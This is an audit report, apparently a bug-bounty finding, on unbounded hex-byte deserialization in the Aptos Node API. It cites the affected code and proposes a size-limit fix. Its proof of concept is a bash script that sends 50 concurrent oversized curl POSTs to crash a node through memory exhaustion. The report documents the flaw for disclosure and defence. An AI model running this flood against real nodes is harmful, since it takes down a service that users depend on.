# Audit Report

## Title
Memory Exhaustion via Unbounded HexEncodedBytes Deserialization in API Endpoints

## Summary
The Aptos Node API accepts unbounded hex-encoded byte vectors in POST request bodies without validating their size before deserialization. Attackers can exploit this to cause memory exhaustion and API node crashes by sending requests with extremely large hex strings within the configurable HTTP body size limit.

## Finding Description
The `HexEncodedBytes` type used throughout the API lacks size validation during deserialization. When a hex-encoded string is deserialized, the following memory allocation occurs: [1](#0-0) 

The `from_str` implementation directly calls `hex::decode` on the input string without any bounds checking. This creates a memory amplification vulnerability because:

1. The entire hex string is loaded into memory from the HTTP request body
2. `hex::decode` allocates a new `Vec<u8>` of approximately half the string's length
3. Both allocations exist simultaneously during deserialization

This type is used in multiple API endpoints that accept POST request bodies:

**Raw Table Item Endpoint:** [2](#0-1) [3](#0-2) [4](#0-3) 

**Raw State Value Endpoint:** [5](#0-4) [6](#0-5) 

While there is an HTTP body size limit configured: [7](#0-6) [8](#0-7) 

This limit is configurable and can be increased by node operators. Even at the default 8 MB limit, an attacker can:

1. Send a request with ~7.9 MB of hex characters (e.g., `{"key": "0x" + "ff" * 4_000_000}`)
2. This allocates ~7.9 MB for the JSON string + ~4 MB for the decoded bytes = ~12 MB per request
3. Send multiple concurrent requests (e.g., 100 requests) to exhaust available memory
4. If operators increase `content_length_limit` (e.g., to 100 MB), a single request allocates ~150 MB

The documentation explicitly states that `vector<u8>` is serialized as hex strings: [9](#0-8) 

## Impact Explanation
This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program criteria: "Validator node slowdowns, API crashes, Significant protocol violations."

An attacker can:
- Cause API nodes to run out of memory and crash, disrupting service availability
- Slow down API response times by consuming memory resources
- Force node operators to restart services
- Affect the ability of users to interact with the blockchain via the API

While this doesn't directly compromise consensus or steal funds, it violates the critical invariant: "Resource Limits: All operations must respect gas, storage, and computational limits."

## Likelihood Explanation
This vulnerability is **highly likely** to be exploited because:

1. **No authentication required**: The affected endpoints are publicly accessible
2. **Simple exploitation**: Requires only standard HTTP POST requests with crafted JSON payloads
3. **No application-layer protection**: After the HTTP body size check, there's no validation before memory allocation
4. **Operator misconfigurations**: Node operators may increase `content_length_limit` without understanding the security implications
5. **Concurrent amplification**: Multiple simultaneous requests multiply the memory consumption

Attack complexity: **Low** - Requires basic HTTP client and understanding of hex encoding.

## Recommendation
Implement size validation in `HexEncodedBytes::from_str` before calling `hex::decode`:

```rust
impl FromStr for HexEncodedBytes {
    type Err = anyhow::Error;

    fn from_str(s: &str) -> anyhow::Result<Self, anyhow::Error> {
        let hex_str = if let Some(hex) = s.strip_prefix("0x") {
            hex
        } else {
            s
        };
        
        // Add maximum size validation (e.g., 1 MB as used in transaction args)
        const MAX_HEX_BYTES: usize = 1_000_000;
        let decoded_size = hex_str.len() / 2;
        if decoded_size > MAX_HEX_BYTES {
            return Err(format_err!(
                "Hex-encoded bytes exceed maximum size of {} bytes (got {} bytes)",
                MAX_HEX_BYTES,
                decoded_size
            ));
        }
        
        Ok(Self(hex::decode(hex_str).map_err(|e| {
            format_err!(
                "decode hex-encoded string({:?}) failed, caused by error: {}",
                s,
                e
            )
        })?))
    }
}
```

Additionally, consider:
1. Documenting the maximum allowed size in API documentation
2. Adding similar limits to other user-controlled input types
3. Implementing per-IP rate limiting for POST endpoints
4. Monitoring memory usage patterns for anomalies

## Proof of Concept

**Step 1**: Create a test script to send a large hex-encoded payload:

```bash
#!/bin/bash
# PoC: Memory exhaustion via large hex payload

NODE_URL="http://localhost:8080"
TABLE_HANDLE="0x1"

# Generate 7.9 MB of hex characters (within default 8 MB limit)
HEX_DATA="0x$(printf 'ff%.0s' {1..4000000})"

# Send multiple concurrent requests
for i in {1..50}; do
  curl -X POST "${NODE_URL}/v1/tables/${TABLE_HANDLE}/raw_item" \
    -H "Content-Type: application/json" \
    -d "{\"key\": \"${HEX_DATA}\"}" &
done

wait
echo "Sent 50 concurrent requests with ~12 MB memory allocation each"
```

**Step 2**: Monitor the API node's memory usage during the attack. Expected behavior: Memory consumption spikes significantly, potentially causing OOM crashes or severe slowdowns.

**Step 3**: Verify by checking node logs for memory pressure indicators or service unavailability.

This PoC demonstrates that an unauthenticated attacker can cause approximately 600 MB of temporary memory allocation (50 requests Ã— 12 MB each), which can overwhelm nodes with limited resources or lead to cascading failures under sustained attack.

### Citations

**File:** api/types/src/move_types.rs (L155-172)
```rust
impl FromStr for HexEncodedBytes {
    type Err = anyhow::Error;

    fn from_str(s: &str) -> anyhow::Result<Self, anyhow::Error> {
        let hex_str = if let Some(hex) = s.strip_prefix("0x") {
            hex
        } else {
            s
        };
        Ok(Self(hex::decode(hex_str).map_err(|e| {
            format_err!(
                "decode hex-encoded string({:?}) failed, caused by error: {}",
                s,
                e
            )
        })?))
    }
}
```

**File:** api/types/src/table.rs (L25-29)
```rust
/// Table Item request for the GetTableItemRaw API
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, Object)]
pub struct RawTableItemRequest {
    pub key: HexEncodedBytes,
}
```

**File:** api/src/state.rs (L194-205)
```rust
    async fn get_raw_table_item(
        &self,
        accept_type: AcceptType,
        /// Table handle hex encoded 32-byte string
        table_handle: Path<Address>,
        /// Table request detailing the key type, key, and value type
        table_item_request: Json<RawTableItemRequest>,
        /// Ledger version to get state of account
        ///
        /// If not provided, it will be the latest version
        ledger_version: Query<Option<U64>>,
    ) -> BasicResultWith404<MoveValue> {
```

**File:** api/src/state.rs (L484-485)
```rust
        let state_key =
            StateKey::table_item(&TableHandle(table_handle.into()), &table_item_request.key.0);
```

**File:** api/src/state.rs (L536-536)
```rust
        let state_key = bcs::from_bytes(&request.key.0)
```

**File:** api/types/src/state.rs (L8-12)
```rust
/// Table Item request for the GetTableItemRaw API
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize, Object)]
pub struct RawStateValueRequest {
    pub key: HexEncodedBytes,
}
```

**File:** config/src/config/api_config.rs (L29-31)
```rust
    /// A maximum limit to the body of a POST request in bytes
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_length_limit: Option<u64>,
```

**File:** config/src/config/api_config.rs (L97-97)
```rust
const DEFAULT_REQUEST_CONTENT_LENGTH_LIMIT: u64 = 8 * 1024 * 1024; // 8 MB
```

**File:** api/types/src/derives.rs (L189-193)
```rust
            Move `vector` type value is serialized into `array`, except `vector<u8>` which is serialized into a
            HexEncodedBytes string with `0x` prefix.
            For example:
              - `vector<u64>{255, 255}` => `[\"255\", \"255\"]`
              - `vector<u8>{255, 255}` => `0xffff`
```
